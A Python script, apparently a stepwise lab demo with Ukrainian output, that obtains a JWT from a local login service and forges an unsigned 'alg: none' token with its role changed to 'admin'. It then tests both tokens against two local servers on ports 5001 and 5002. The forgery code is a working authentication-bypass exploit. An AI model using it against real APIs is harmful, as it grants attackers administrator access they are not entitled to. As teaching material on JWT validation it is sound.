import sys, base64, json, time, jwt, requests

def b64(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()
def get_token(): return requests.post("http://localhost:5001/login").json()["token"]
def forged():
    c = jwt.decode(get_token(), options={"verify_signature": False})
    c["role"] = "admin"
    return b64({"alg": "none", "typ": "JWT"}) + "." + b64(c) + "."
def call(port, tok):
    r = requests.get(f"http://localhost:{port}/api", headers={"Authorization": "Bearer " + tok})
    print(f"порт {port}: HTTP {r.status_code} {r.text.strip()}")

step = sys.argv[1]
if step == "1":
    tok = get_token(); print("токен:", tok[:30] + "...")
    c = jwt.decode(tok, options={"verify_signature": False})
    print(json.dumps(c, indent=2))
    print("exp =", time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(c["exp"])))
elif step == "2":
    call(5001, get_token())
elif step == "3":
    call(5002, get_token())
elif step in ("4", "5"):
    f = forged(); print("підроблений токен:", f[:30] + "...")
    call(5001 if step == "4" else 5002, f)
elif step == "tok":
    print(get_token())
elif step == "forged":
    print(forged())
